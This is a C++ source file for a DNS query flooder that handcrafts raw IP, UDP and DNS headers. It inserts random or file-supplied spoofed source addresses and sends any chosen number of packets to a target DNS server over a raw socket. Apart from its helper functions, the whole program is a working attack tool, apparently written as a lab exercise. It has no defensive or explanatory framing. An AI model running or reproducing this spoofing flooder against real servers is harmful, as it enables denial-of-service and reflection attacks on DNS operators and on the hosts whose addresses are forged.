#include <iostream>
#include <stdio.h>
#include <string.h>
#include <string>
#include <vector>
#include <fstream>
#include <math.h>
#include <algorithm>
#include <sstream>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>

using namespace std;

string int2string(int x){
	string xs = "";
	while(true){
		int rem = x%10;
		xs += ('0'+rem);
		x /= 10;
		if(x==0) break;
	}
	reverse(xs.begin(), xs.end());
	return xs;
}

int string2int(string s){
	int ret = 0, pw = 1;
	int len = s.length();
	for(int i = len-1; i>=0; i--){
		ret += ((s[i]-'0')*pw);
		pw *= 10;
	}
	return ret;
}

int send_packet_raw(int sock, unsigned char *ip, int n, string dstIP)
{

	const char* dstIP_ = dstIP.c_str();
	struct sockaddr_in dest_info;
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr.s_addr = inet_addr(dstIP_);

	int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	if (r>=0) printf("Sent a packet of size: %d\n", r);
	else printf("Failed to send packet. Did you run it using sudo?\n");
}

int main(int argc, char const *argv[])
{
	/*
	string input;
	cin>>input;
	int len = input.length();
	unsigned char byt[len+10];
	memset(byt, 0, sizeof(byt));
	for(int i = 0; i<len; i++){
		//byt[i] = (input[i]<0)?(input[i]+255):input[i];
		//cout<<int(input[i])<<endl;
		byt[i] = (unsigned char) input[i];
	}
	FILE *f = fopen("holy.bin", "wb");
	fwrite(byt, 1, len+10, f);
	*/

	string targetServer;
	if(argc<5){
		printf("%s", "Target DNS Server IP: ");
		cin >> targetServer;
	}
	else{
		targetServer = argv[1];
	}

	int choice;

	//selection of ip addresses to put in spoofed packets
	if(argc<5){
		printf("%s\n", "IP spoofing: 1) Random 2) From File");
		scanf("%d", &choice);
	}
	else{
		choice = atoi(argv[2]);
	}

	vector<string> srcIPs;
	if(choice == 1){
		//doing nothing here
		//before putting source ip check if the srcIPs list is empty
		//if empty, generate random ip there
	}

	else{
		string tmp;
		ifstream file("sourceIP.txt"); //file just has some sentences
		if (!file) {
			cout << "unable to open file :( ";
			return false;
		}
		while (getline (file, tmp)){
			if(tmp.length()>0) srcIPs.push_back(tmp);
		}
		file.close();
	}


	//selection of domain names to put in query
	
	if(argc<5){
		printf("%s\n", "Domain Search: 1) Input directly 2) From File");
		scanf("%d", &choice);
	}
	else{
		choice = atoi(argv[3]);
	}

	vector<string> domainNames;
	if(choice == 1){
		printf("%s\n", "Enter domain name: ");
		string tmp;
		cin>>tmp;
		if(tmp.length()>0) domainNames.push_back(tmp);
	}

	else{
		string tmp;
		ifstream file("domainNames.txt"); //file just has some sentences
		if (!file) {
			cout << "unable to open file :( ";
			return false;
		}
		while (getline (file, tmp)){
			domainNames.push_back(tmp);
		}
		file.close();
	}

	
	int pkt_cnt;

	if(argc<5){
		printf("%s", "How many packets? ");

		cin>>pkt_cnt;
	}
	else{
		pkt_cnt = atoi(argv[4]);
	}

	// Create raw socket
	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));      


	for(int i = 0; i<pkt_cnt; i++){
		string srcIP = "";

		if(srcIPs.size()==0){
			//random ip to be generated
			for(int j = 0; j<4; j++){
				int x = (int) (rand()%256);
				string xs = int2string(x);
				srcIP += xs;
				if(j!=3){
					srcIP += ".";
				}
			}
		}
		else{
			//take a random ip from sourceIPs.txt
			int idx = (int) (rand() % srcIPs.size());
			srcIP = srcIPs[idx];
		}

		string domainName;
		int dn_idx = (int) (rand() % domainNames.size());
		domainName = domainNames[dn_idx];
		

		//NOW we can construct packets

		unsigned char pkt[2048];
		memset(pkt, 0, sizeof(pkt));
		int start;

		//Making of DNS section
		//Header section
		// AA AA - ID
		// 01 00 - Query parameters
		// 00 01 - Number of questions
		// 00 00 - Number of answers
		// 00 00 - Number of authority records
		// 00 00 - Number of additional records

		start = 28;
		int id1, id2;
		id1 = rand()%256;
		id2 = rand()%256;

		pkt[start++] = (unsigned int) id1;
		pkt[start++] = (unsigned int) id2;

		pkt[start] = 1;
		start += 3;
		pkt[start] = 1;

		//Question section
		start = 40;

		//ipv4 string to unsigned char array 
		stringstream ss(domainName);
		string tmp;
		vector<string> frags;
		while(getline(ss, tmp, '.')){
			frags.push_back(tmp);
		}

		int frag_cnt = frags.size();
		

		for(int j = 0; j<frag_cnt; j++){
			int sz = frags[j].size();
			pkt[start] = (unsigned char) sz; 
			start++;
			for(int k = 0; k<sz; k++){
				pkt[start] = (unsigned char)frags[j][k];
				start++;
			}
		}

		// rest part 
		// 00    - zero byte to end the QNAME 
		// 00 01 - QTYPE 
		// 00 01 - QCLASS
		pkt[start++] = 0;
		pkt[start++] = 0;
		pkt[start++] = 1;
		pkt[start++] = 0;
		pkt[start++] = 1;


		//Making of UPD header
		int udp_len = start - 20;

		start = 20;
		int len1 = (int)(udp_len/256);
		int len2 = (int)(udp_len%256);

		// src port
		pkt[start++] = 0; 
		pkt[start++] = 53; 

		// dst port
		pkt[start++] = 0;
		pkt[start++] = 53;
		
		//length
		pkt[start++] = len1;
		pkt[start++] = len2;


		//Making of IP header
		int total_len = udp_len + 20;

/* 

    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


	took it from RFC

*/
		start = 0;

		pkt[start++] = 69; //0x45
		start++;
		int len1_ = (int)(total_len/256);
		int len2_ = (int)(total_len%256);

		pkt[start++] = len1_;
		pkt[start++] = len2_;

		start++;
		pkt[start++] = 1;


		start = 8;
		pkt[start++] = 64; //ttl 
		pkt[start++] = 17; //protocol - udp

		//SOURCE and DEST IP address 
		//ipv4 string to unsigned char array 

		start = 12;
		stringstream ss_srcIP(srcIP);
		string tmp_srcIP;
		vector<string> frags_srcIP;
		while(getline(ss_srcIP, tmp_srcIP, '.')){
			frags_srcIP.push_back(tmp_srcIP);
		}

		int frag_cnt_srcIP = frags_srcIP.size();
		

		for(int j = 0; j<frag_cnt_srcIP; j++){
			pkt[start++] = string2int(frags_srcIP[j]);
		}

		string dstIP = targetServer;

		stringstream ss_dstIP(dstIP);
		string tmp_dstIP;
		vector<string> frags_dstIP;
		while(getline(ss_dstIP, tmp_dstIP, '.')){
			frags_dstIP.push_back(tmp_dstIP);
		}

		int frag_cnt_dstIP = frags_dstIP.size();
		

		for(int j = 0; j<frag_cnt_dstIP; j++){
			pkt[start++] = string2int(frags_dstIP[j]);
		}





		//COMPUTE CHECKSUM

		//int arr[9];
		//int ai = 0;
		int sum = 0;
		for(int ii = 0; ii<20; ii+=2){
			if(ii!=10){
				int hi = pkt[ii];
				int lo = pkt[ii+1];
				int num_16bit = hi*(1<<8) + lo;
				sum += num_16bit;
				//arr[ai++] = num_16bit;
			}
		}
		int tmp_cs = sum;
		while(true)	
		{
			int hi = (int) (tmp_cs/(1<<16));
			int lo = (int) (tmp_cs%(1<<16));
			tmp_cs = lo + hi;
			if(hi==0) break;
			
		}
		tmp_cs = ((1<<16) - 1) - tmp_cs;
		start = 10;
		pkt[start++] = (unsigned char) (tmp_cs/(1<<8));
		pkt[start++] = (unsigned char) (tmp_cs%(1<<8));


		

		// Send the IP packet out
     	send_packet_raw(sock, pkt, total_len, dstIP);

     	cout<<srcIP<< " "<<domainName<<endl;
		
		FILE *f = fopen("holy.bin", "wb");
		fwrite(pkt, 1, total_len, f);
		printf("%d\n", i);
		//sleep(0.001);
	}


	return 0;
}


